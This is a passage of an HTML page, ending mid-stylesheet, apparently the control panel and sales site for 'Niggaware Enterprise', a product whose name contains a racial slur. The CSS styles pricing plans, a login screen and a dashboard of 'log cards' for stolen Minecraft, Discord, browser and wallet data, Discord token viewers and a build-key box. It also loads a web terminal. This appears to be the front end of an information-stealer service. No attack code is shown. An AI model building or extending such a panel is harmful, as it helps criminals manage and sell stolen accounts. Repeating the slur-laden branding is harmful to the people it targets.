<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Niggaware Enterprise - Control Panel</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap"
        rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <!-- Socket.IO for live streaming -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <!-- Cesium removed to prevent large WebAssembly usage and OOM crashes -->
    <!-- Cesium removed: <script src="https://cesium.com/downloads/cesiumjs/releases/1.113/Build/Cesium/Cesium.js"></script> -->
    <!-- Cesium removed: <link href="https://cesium.com/downloads/cesiumjs/releases/1.113/Build/Cesium/Widgets/widgets.css" rel="stylesheet"> -->
    <!-- xterm.js -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            /* SOLID DARK THEME (High Contrast) */
            --bg-primary: #050505;
            /* Pure Dark */
            --bg-secondary: #0a0a0a;
            /* Slightly lighter */
            --bg-card: #141414;
            /* Solid Card Background */
            --bg-hover: #1f1f1f;

            --accent: #a855f7;
            /* Keep Purple Accent */
            --accent-hover: #9333ea;
            --accent-dim: rgba(168, 85, 247, 0.1);
            /* Subtle accent bg */

            --success: #22c55e;
            --warning: #f59e0b;
            --danger: #ef4444;

            --text-primary: #ffffff;
            /* Pure White */
            --text-secondary: #d4d4d8;
            /* Light Grey */
            --text-muted: #a1a1aa;

            --border: #3f3f46;
            /* Better defined border */
            --glow: none;
            /* Removed flashy glow by default */

            --font-mono: 'JetBrains Mono', monospace;
        }

        #cyber-canvas {
            display: none;
            /* Remove distracting background canvas */
        }

        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Inter', sans-serif;
            overflow-x: hidden;
        }

        .sidebar {
            background-color: var(--bg-secondary) !important;
            border-right: 1px solid var(--border) !important;
        }

        .card {
            background-color: var(--bg-card) !important;
            border: 1px solid var(--border) !important;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.5);
            /* Stronger shadow */
            transition: border-color 0.2s;
        }

        .card:hover {
            border-color: var(--accent) !important;
        }

        .nav-item.active {
            background: linear-gradient(90deg, rgba(168, 85, 247, 0.2), transparent);
            border-left: 3px solid var(--accent);
            color: var(--accent);
        }

        .btn-primary {
            background: linear-gradient(135deg, #7e22ce, #a855f7);
            border: none;
            box-shadow: 0 0 10px rgba(126, 34, 206, 0.5);
        }

        .btn-primary:hover {
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.8);
            transform: translateY(-1px);
        }

        .easter-bunny {
            position: fixed;
            font-size: 3rem;
            animation: hop 0.5s ease-in-out infinite;
            pointer-events: none;
            z-index: 9997;
        }


        .terminal-container {
            width: 100%;
            height: 500px;
            background-color: #000;
            padding: 10px;
            border-radius: 6px;
            overflow: hidden;
            border: 1px solid #333;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            background-image: radial-gradient(circle at 50% 0%, #1a2e24 0%, #050505 60%);
            background-attachment: fixed;
            color: var(--text-primary);
            min-height: 100vh;
        }

        /* Animations */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0.5;
            }
        }

        @keyframes glow {

            0%,
            100% {
                box-shadow: 0 0 5px var(--accent);
            }

            50% {
                box-shadow: 0 0 20px var(--accent), 0 0 30px var(--accent);
            }
        }

        @keyframes slideInLeft {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }

            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .animate-fade {
            animation: fadeIn 0.4s ease-out;
        }

        .animate-slide {
            animation: slideInLeft 0.3s ease-out;
        }

        .drag-over {
            border-color: var(--accent) !important;
            background: rgba(0, 255, 157, 0.1) !important;
        }

        .animate-scale {
            animation: scaleIn 0.3s ease-out;
        }

        .animate-pulse {
            animation: pulse 2s infinite;
        }

        .animate-glow {
            animation: glow 2s infinite;
        }

        /* Login & Landing Page */
        .login-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: linear-gradient(135deg, #0a0a0c 0%, #1a0a2e 50%, #0a1a1a 100%);
            overflow-x: hidden;
            position: relative;
        }

        /* Animated background particles */
        .login-container::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image:
                radial-gradient(circle at 20% 80%, rgba(0, 255, 157, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(147, 51, 234, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 255, 157, 0.02) 0%, transparent 30%);
            pointer-events: none;
            z-index: 0;
        }

        /* Floating particles animation */
        @keyframes float {

            0%,
            100% {
                transform: translateY(0) rotate(0deg);
                opacity: 0.5;
            }

            50% {
                transform: translateY(-20px) rotate(180deg);
                opacity: 1;
            }
        }

        @keyframes floatReverse {

            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }

            50% {
                transform: translateY(20px) rotate(-180deg);
            }
        }

        @keyframes gradientShift {
            0% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }

            100% {
                background-position: 0% 50%;
            }
        }

        @keyframes typewriter {
            from {
                width: 0;
            }

            to {
                width: 100%;
            }
        }

        @keyframes blink {
            50% {
                border-color: transparent;
            }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes scaleInBounce {
            0% {
                opacity: 0;
                transform: scale(0.8);
            }

            70% {
                transform: scale(1.05);
            }

            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        .landing-nav {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
            background: rgba(5, 5, 5, 0.8);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .landing-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--accent);
        }

        .landing-logo i {
            font-size: 1.8rem;
            filter: drop-shadow(0 0 10px var(--accent));
        }

        .landing-nav-links {
            display: flex;
            gap: 30px;
            align-items: center;
        }

        .landing-nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 16px;
            border-radius: 8px;
        }

        .landing-nav-links a:hover {
            color: var(--accent);
            background: rgba(0, 255, 157, 0.1);
        }

        .discord-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            background: linear-gradient(135deg, #5865f2, #7c3aed);
            padding: 10px 20px !important;
            border-radius: 10px !important;
            color: white !important;
            font-weight: 600 !important;
            transition: all 0.3s !important;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
        }

        .discord-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(88, 101, 242, 0.5);
            background: linear-gradient(135deg, #6d77f5, #8b5cf6) !important;
        }

        /* Hero Section */
        .hero-section {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 120px 40px 80px;
            position: relative;
            z-index: 1;
        }

        .hero-content {
            max-width: 900px;
            animation: slideUp 1s ease-out;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 255, 157, 0.1);
            border: 1px solid rgba(0, 255, 157, 0.3);
            padding: 8px 20px;
            border-radius: 50px;
            font-size: 0.9rem;
            color: var(--accent);
            margin-bottom: 30px;
            animation: scaleInBounce 0.8s ease-out 0.3s both;
        }

        .hero-title {
            font-size: 4rem;
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 24px;
            background: linear-gradient(135deg, #ffffff 0%, var(--accent) 50%, #7c3aed 100%);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 5s ease infinite;
        }

        .hero-subtitle {
            font-size: 1.3rem;
            color: var(--text-secondary);
            max-width: 600px;
            margin: 0 auto 40px;
            line-height: 1.7;
        }

        .hero-buttons {
            display: flex;
            gap: 16px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .hero-btn {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.3s;
            cursor: pointer;
            border: none;
        }

        .hero-btn-primary {
            background: linear-gradient(135deg, var(--accent), #00cc7d);
            color: #000;
            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.4);
        }

        .hero-btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 30px rgba(0, 255, 157, 0.6);
        }

        .hero-btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .hero-btn-secondary:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: var(--accent);
        }

        /* Stats Section */
        .stats-section {
            padding: 60px 40px;
            display: flex;
            justify-content: center;
            gap: 60px;
            flex-wrap: wrap;
            position: relative;
            z-index: 1;
        }

        .stat-item {
            text-align: center;
            animation: slideUp 0.8s ease-out both;
        }

        .stat-item:nth-child(1) {
            animation-delay: 0.1s;
        }

        .stat-item:nth-child(2) {
            animation-delay: 0.2s;
        }

        .stat-item:nth-child(3) {
            animation-delay: 0.3s;
        }

        .stat-item:nth-child(4) {
            animation-delay: 0.4s;
        }

        .stat-number {
            font-size: 3rem;
            font-weight: 800;
            color: var(--accent);
            text-shadow: 0 0 30px rgba(0, 255, 157, 0.5);
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 0.95rem;
            margin-top: 8px;
        }

        /* Features Section */
        .features-section {
            padding: 80px 40px;
            position: relative;
            z-index: 1;
        }

        .section-title {
            text-align: center;
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 16px;
            color: var(--text-primary);
        }

        .section-subtitle {
            text-align: center;
            color: var(--text-secondary);
            max-width: 600px;
            margin: 0 auto 60px;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 24px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .feature-card {
            background: rgba(15, 11, 30, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 32px;
            transition: all 0.4s;
            animation: slideUp 0.8s ease-out both;
        }

        .feature-card:hover {
            transform: translateY(-8px);
            border-color: var(--accent);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3), 0 0 30px rgba(0, 255, 157, 0.1);
        }

        .feature-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, var(--accent), #00cc7d);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: #000;
            margin-bottom: 20px;
            box-shadow: 0 8px 25px rgba(0, 255, 157, 0.3);
        }

        .feature-title {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .feature-desc {
            color: var(--text-secondary);
            line-height: 1.6;
        }

        /* Pricing Section */
        .pricing-section {
            padding: 80px 40px;
            position: relative;
            z-index: 1;
        }

        .pricing-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
            gap: 30px;
            max-width: 900px;
            margin: 0 auto;
        }

        .pricing-card {
            background: rgba(15, 11, 30, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 40px;
            text-align: center;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }

        .pricing-card.featured {
            border-color: var(--accent);
            box-shadow: 0 0 40px rgba(0, 255, 157, 0.2);
        }

        .pricing-card.featured::before {
            content: 'MOST POPULAR';
            position: absolute;
            top: 20px;
            right: -35px;
            background: linear-gradient(135deg, var(--accent), #00cc7d);
            color: #000;
            padding: 6px 40px;
            font-size: 0.7rem;
            font-weight: 700;
            transform: rotate(45deg);
        }

        .pricing-card:hover {
            transform: translateY(-10px);
        }

        .pricing-name {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .pricing-price {
            font-size: 3.5rem;
            font-weight: 800;
            color: var(--accent);
            margin: 20px 0;
        }

        .pricing-price span {
            font-size: 1rem;
            color: var(--text-secondary);
            font-weight: 400;
        }

        .pricing-features {
            list-style: none;
            margin: 30px 0;
            text-align: left;
        }

        .pricing-features li {
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .pricing-features li i {
            color: var(--accent);
            width: 20px;
        }

        .pricing-features li.disabled {
            color: var(--text-muted);
        }

        .pricing-features li.disabled i {
            color: var(--text-muted);
        }

        .pricing-btn {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            border: none;
        }

        .pricing-btn-primary {
            background: linear-gradient(135deg, var(--accent), #00cc7d);
            color: #000;
        }

        .pricing-btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        /* Login Modal */
        .login-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }

        .login-modal.active {
            display: flex;
        }

        /* Glassmorphism & Toggles */
        .glass-panel {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .switch-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            margin-bottom: 12px;
            border: 1px solid transparent;
            transition: all 0.2s;
        }

        .switch-container:hover {
            border-color: rgba(255, 255, 255, 0.1);
            background: rgba(0, 0, 0, 0.3);
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 44px;
            height: 24px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: var(--bg-hover);
            transition: .4s;
            border-radius: 24px;
            border: 1px solid var(--border);
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 2px;
            bottom: 2px;
            background-color: var(--text-secondary);
            transition: .4s;
            border-radius: 50%;
        }

        input:checked+.slider {
            background-color: var(--accent);
            border-color: var(--accent);
        }

        input:checked+.slider:before {
            transform: translateX(20px);
            background-color: #fff;
        }

        .setting-icon {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            margin-right: 16px;
            color: var(--text-primary);
        }

        .login-box {
            background: rgba(15, 11, 30, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
        }

        .login-logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-logo i {
            font-size: 48px;
            color: var(--accent);
            margin-bottom: 16px;
            display: block;
            text-shadow: 0 0 20px var(--accent);
        }

        .login-logo h1 {
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .login-logo p {
            color: var(--text-secondary);
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--text-secondary);
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            transition: all 0.2s;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.2);
        }

        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            justify-content: center;
        }

        .btn-primary {
            background: var(--accent);
            color: white;
        }

        .btn-primary:hover {
            background: var(--accent-hover);
            box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
        }

        .btn-secondary {
            background: var(--bg-hover);
            color: var(--text-primary);
            border: 1px solid var(--border);
        }

        .btn-secondary:hover {
            background: var(--border);
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-sm {
            padding: 6px 12px;
            font-size: 12px;
        }

        .btn-icon {
            padding: 8px;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .error-msg {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .register-link {
            text-align: center;
            margin-top: 20px;
            color: var(--text-secondary);
            font-size: 14px;
        }

        /* App */
        .app {
            display: none;
            min-height: 100vh;
        }

        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            bottom: 0;
            width: 260px;
            background: rgba(19, 19, 22, 0.95);
            backdrop-filter: blur(10px);
            border-right: 1px solid var(--border);
            padding: 20px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .sidebar-logo {
            display: flex;
            align-items: center;
            gap: 12px;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 16px;
            position: relative;
            flex-shrink: 0;
        }

        .sidebar-logo i {
            font-size: 24px;
            color: var(--accent);
        }

        .sidebar-logo span {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-primary);
            letter-spacing: -0.5px;
        }

        .sidebar nav {
            flex: 1;
            overflow-y: auto;
            overflow-x: hidden;
            padding-right: 8px;
            margin-right: -8px;
            scrollbar-width: thin;
            scrollbar-color: var(--border) transparent;
        }

        .sidebar nav::-webkit-scrollbar {
            width: 6px;
        }

        .sidebar nav::-webkit-scrollbar-track {
            background: transparent;
        }

        .sidebar nav::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 3px;
        }

        .sidebar nav::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 4px;
            font-weight: 500;
        }

        .nav-item:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }

        .nav-item.active {
            background: var(--accent);
            color: white;
            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3);
        }

        .nav-item i {
            width: 20px;
            text-align: center;
        }

        .nav-section {
            font-size: 11px;
            text-transform: uppercase;
            color: var(--text-muted);
            padding: 16px 16px 8px;
            letter-spacing: 0.5px;
            font-weight: 700;
        }

        .user-info {
            margin-top: auto;
            padding: 16px;
            background: var(--bg-card);
            border-radius: 8px;
            flex-shrink: 0;
            border: 1px solid var(--border);
        }

        .user-info-name {
            font-weight: 600;
            margin-bottom: 4px;
        }

        .user-info-role {
            font-size: 12px;
            color: var(--accent);
        }

        .main {
            margin-left: 260px;
            padding: 32px;
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: transparent;
        }

        .page {
            display: none;
            flex: 1;
            overflow: auto;
        }

        .page.active {
            display: flex;
            flex-direction: column;
        }

        .page-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            flex-shrink: 0;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 24px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 24px;
            transition: transform 0.2s;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: var(--accent);
        }

        .stat-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .stat-card-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .stat-card-icon.purple {
            background: rgba(139, 92, 246, 0.1);
            color: var(--accent);
        }

        .stat-card-icon.green {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }

        .stat-card-icon.yellow {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }

        .stat-card-icon.red {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
        }

        .stat-card-icon.blue {
            background: rgba(88, 101, 242, 0.1);
            color: var(--discord-blue);
        }

        .stat-card-icon.mc {
            background: rgba(34, 197, 94, 0.1);
            color: var(--mc-green);
        }

        .stat-card-value {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -1px;
        }

        .stat-card-label {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 4px;
        }

        /* Log Cards */
        .logs-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }

        .log-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.2s;
        }

        .log-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
            box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
        }

        .log-card-header {
            padding: 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-secondary);
        }

        .log-card-type {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .log-type-badge {
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .log-type-badge.minecraft {
            background: rgba(34, 197, 94, 0.1);
            color: var(--mc-green);
        }

        .log-type-badge.discord {
            background: rgba(88, 101, 242, 0.1);
            color: var(--discord-blue);
        }

        .log-type-badge.browser {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }

        .log-type-badge.wallet {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
        }

        .log-type-badge.system {
            background: rgba(139, 92, 246, 0.1);
            color: var(--accent);
        }

        .log-type-badge.zip {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }

        .log-card-actions {
            display: flex;
            gap: 8px;
        }

        .log-card-body {
            padding: 16px;
        }

        .log-info-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }

        .log-info-row i {
            color: var(--text-muted);
            width: 16px;
            text-align: center;
        }

        .log-info-row span {
            color: var(--text-secondary);
        }

        .log-preview {
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 12px;
            margin-top: 12px;
            border: 1px solid var(--border);
        }

        .log-preview-title {
            font-size: 11px;
            text-transform: uppercase;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 600;
        }

        .log-preview-content {
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 12px;
            color: var(--text-primary);
            word-break: break-all;
        }

        .log-preview-copy {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 8px;
        }

        .copy-btn {
            background: var(--bg-hover);
            border: 1px solid var(--border);
            color: var(--text-secondary);
            padding: 4px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            transition: all 0.2s;
        }

        .copy-btn:hover {
            background: var(--accent);
            color: white;
            border-color: var(--accent);
        }

        .copy-btn.copied {
            background: var(--success);
            color: white;
            border-color: var(--success);
        }

        /* Enhanced Discord Styles */
        .discord-avatar {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 3px solid var(--discord-blue);
        }

        .discord-banner {
            background-size: cover;
            background-position: center;
            min-height: 120px;
            border-radius: 8px;
            margin-bottom: 16px;
        }

        .discord-badge {
            background: var(--accent);
            color: white;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 500;
            display: inline-block;
            margin: 2px;
        }

        .discord-info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 20px;
        }

        .discord-info-card {
            background: rgba(15, 11, 30, 0.85);
            backdrop-filter: blur(20px);
            padding: 16px;
            border-radius: 8px;
            border: 1px solid var(--border);
        }

        .log-card {
            background: rgba(15, 11, 30, 0.8) !important;
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 12px;
            margin-bottom: 12px;
            overflow: hidden;
            transition: all 0.2s;
        }

        .discord-info-header {
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .discord-info-content {
            font-size: 13px;
            line-height: 1.5;
        }

        .discord-token-container {
            background: var(--bg-secondary);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 16px;
        }

        .discord-token-header {
            font-size: 11px;
            color: var(--text-muted);
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .discord-token-content {
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
            color: var(--discord-blue);
            background: var(--bg-primary);
            padding: 12px;
            border-radius: 6px;
            max-height: 120px;
            overflow-y: auto;
        }

        .discord-enhanced-badge {
            background: var(--success);
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 9px;
        }

        .discord-basic-badge {
            background: var(--warning);
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 9px;
        }

        .rare-friend-card {
            padding: 8px;
            margin-bottom: 6px;
            background: var(--bg-primary);
            border-radius: 6px;
            border-left: 3px solid var(--danger);
        }

        .rare-friend-name {
            font-weight: 500;
            margin-bottom: 4px;
        }

        .rare-friend-badges {
            font-size: 11px;
            color: var(--text-muted);
        }

        .log-card-footer {
            padding: 12px 16px;
            border-top: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: var(--text-muted);
        }

        /* Filter */
        .filter-bar {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .filter-btn {
            padding: 8px 16px;
            border-radius: 20px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            color: var(--text-secondary);
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
            font-weight: 500;
        }

        .filter-btn:hover {
            border-color: var(--accent);
            color: var(--text-primary);
        }

        .filter-btn.active {
            background: var(--accent);
            border-color: var(--accent);
            color: white;
        }

        /* Table */
        .table-container {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: auto;
            max-height: calc(100vh - 250px);
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th,
        td {
            padding: 16px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }

        th {
            background: var(--bg-secondary);
            font-size: 12px;
            text-transform: uppercase;
            color: var(--text-muted);
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        tr:hover {
            background: var(--bg-hover);
        }

        /* Build Key */
        .build-key-box {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .build-key-label {
            font-size: 11px;
            text-transform: uppercase;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 600;
        }

        .build-key-value {
            font-family: 'Monaco', monospace;
            font-size: 14px;
            color: var(--accent);
            word-break: break-all;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 1000;
            animation: slideIn 0.3s;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            font-weight: 500;
        }

        .toast.success {
            background: var(--success);
            color: white;
        }

        .toast.error {
            background: var(--danger);
            color: white;
        }

        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }

            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 100;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(4px);
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
